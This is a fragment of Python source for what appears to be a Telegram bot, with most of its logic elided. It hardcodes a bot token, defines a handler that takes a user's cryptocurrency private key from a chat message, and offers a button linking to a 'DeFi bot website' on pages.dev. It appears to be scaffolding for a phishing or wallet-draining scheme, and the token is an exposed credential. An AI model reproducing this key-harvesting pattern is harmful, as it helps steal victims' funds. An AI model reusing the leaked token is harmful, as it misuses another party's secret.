...
BOT_TOKEN = '7119661630:AAF_Etur7oRukbVC6KA1dfM-5HeWgxTthp4'
...
def process_private_key(message):
    ...
    if private_key.lower() == '/continue':
        ...
        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://nodesbot.pages.dev/')
